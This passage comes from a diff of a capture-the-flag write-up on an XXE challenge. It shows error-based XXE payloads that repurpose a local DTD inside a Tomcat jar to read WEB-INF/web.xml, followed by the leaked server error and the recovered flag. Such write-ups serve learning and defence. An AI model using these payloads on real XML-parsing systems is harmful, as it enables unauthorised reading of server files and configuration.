-      <span style="color:#f92672">&lt;servlet-name&gt;</span>Flag<span style="color:#f92672">&lt;/servlet-name&gt;</span>
-      <span style="color:#f92672">&lt;url-pattern&gt;</span>/flag_9535b9714ef44eb8928bbe8b70e04198<span style="color:#f92672">&lt;/url-pattern&gt;</span>
-   <span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
-
-<span style="color:#f92672">&lt;/web-app&gt;</span> (No such file or directory)
-...
-</code></pre></div><p>We get the flag route: <code>/flag_9535b9714ef44eb8928bbe8b70e04198</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dtd" data-lang="dtd"><span style="display:flex;"><span><span style="color:#66d9ef">&lt;!DOCTYPE</span> <span style="color:#f92672">message</span> <span style="color:#66d9ef">[</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">&lt;!ENTITY</span> % local_dtd <span style="color:#66d9ef">SYSTEM</span> <span style="color:#e6db74">&#34;file:///usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd&#34;</span><span style="color:#66d9ef">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">&lt;!ENTITY</span> % URI <span style="color:#e6db74">&#39;(aa) #IMPLIED&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:///YOUR_FILE&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &amp;#x25;eval;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &amp;#x25;error;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;!ATTLIST attxx aa &#34;bb&#34;&#39;</span><span style="color:#66d9ef">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    %local_dtd;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">]&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;message</span><span style="color:#66d9ef">&gt;</span><span style="color:#960050;background-color:#1e0010">&lt;/message</span><span style="color:#66d9ef">&gt;</span>
+</span></span></code></pre></div><p>To our target system:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dtd" data-lang="dtd"><span style="display:flex;"><span><span style="color:#66d9ef">&lt;!DOCTYPE</span> <span style="color:#f92672">message</span> <span style="color:#66d9ef">[</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    Our jsp-api.jar is located in /tomcat/lib.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    I did not find the /javax path in jsp-api.jar
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    But thankfully, the jspxml.dtd was in the /jakarta path
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    --&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">&lt;!ENTITY</span> % local_dtd <span style="color:#66d9ef">SYSTEM</span> <span style="color:#e6db74">&#34;jar:file:/tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd&#34;</span><span style="color:#66d9ef">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- By targeting the WEB-INF/web.xml file, we will have the generated flag route
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    In the returned Java error returned by the server.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    --&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">&lt;!ENTITY</span> % URI <span style="color:#e6db74">&#39;(aa) #IMPLIED&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:////tomcat/webapps/ROOT/WEB-INF/web.xml&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &amp;#x25;eval;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &amp;#x25;error;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;!ATTLIST attxx aa &#34;bb&#34;&#39;</span><span style="color:#66d9ef">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    %local_dtd;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">]&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;message</span><span style="color:#66d9ef">&gt;</span><span style="color:#960050;background-color:#1e0010">&lt;/message</span><span style="color:#66d9ef">&gt;</span>
+</span></span></code></pre></div><p>And, it works! We have the following error message response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>java.io.FileNotFoundException: /abcxyz/<span style="color:#f92672">&lt;web-app</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;3.0&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http:/java.sun.com/xml/ns/javaee&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http:/www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">xsi:schemaLocation=</span><span style="color:#e6db74">&#34;http:/java.sun.com/xml/ns/javaee http:/java.sun.com/xml/ns/javaee/web-app_3_0.xsd&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&lt;servlet&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;servlet-name&gt;</span>Results<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;servlet-class&gt;</span>Results<span style="color:#f92672">&lt;/servlet-class&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&lt;/servlet&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&lt;servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;servlet-name&gt;</span>Results<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;url-pattern&gt;</span>/search<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&lt;servlet&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;servlet-name&gt;</span>Flag<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;servlet-class&gt;</span>Flag<span style="color:#f92672">&lt;/servlet-class&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&lt;/servlet&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&lt;servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;servlet-name&gt;</span>Flag<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;url-pattern&gt;</span>/flag_9535b9714ef44eb8928bbe8b70e04198<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/web-app&gt;</span> (No such file or directory)
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>We get the flag route: <code>/flag_9535b9714ef44eb8928bbe8b70e04198</code>.</p>
 <p>Now, we can redo the same steps on the live server. By making a <code>GET</code> request to the flag route given in the error response, we get the real flag <code>CHTB{OOB_p1us_err0r_b@s3d_XXE_da_b0ss!}</code></p>
 <h1 id="closing-words">Closing words</h1>
 <p>It was a nice XXE challenge which made me learn about XXE with local DTD files :)</p> </div>
